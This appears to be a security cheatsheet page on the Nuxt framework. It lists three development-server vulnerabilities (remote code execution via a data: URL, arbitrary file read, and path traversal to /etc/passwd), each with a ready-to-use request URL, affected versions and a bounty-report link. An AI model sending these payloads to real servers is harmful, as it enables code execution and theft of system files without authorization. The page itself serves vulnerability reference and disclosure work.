---
title: "Nuxt"
description: "Cheatsheet on Nuxt"
lead: "Cheatsheet on Nuxt"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "framework"
weight: 620
toc: true
---

## Nuxt

[Nuxt](https://github.com/nuxt/nuxt) is an intuitive and extendable way to create type-safe, performant and production-grade full-stack web apps and websites with Vue 3.

## Vulnerabilities

### Remote Code execution 

- `http://localhost:3000/__nuxt_component_test__/?path=data%3Atext%2Fjavascript%2Cconsole%2Elog%28%22hello%21%22%29%3B`
- Version: <= v3.4.0-2 (development server)
- [Huntr -  RCE in developer mode in nuxt/nuxt](https://huntr.dev/bounties/1eb74fd8-0258-4c1f-a904-83b52e373a87/)

### Abritrary file read

- `http://localhost:3000/__nuxt_vite_node__/module//bin/passwd`
- Version: 3.0.0-RC8 - 3.4.1 (development server)
- [Huntr - (Almost) Arbitary File Read on Development Server in nuxt/nuxt](https://huntr.dev/bounties/7840cd32-af15-40cb-a148-7ef3dff4a0c2/)

### Path traversal

- http://localhost:3000/_nuxt/@fs/etc/passwd
- Version: <= rc12 (development server)
- [Huntr - Dev mode Path traversal in nuxt/framework](https://huntr.dev/bounties/4849af83-450c-435e-bc0b-71705f5be440/)
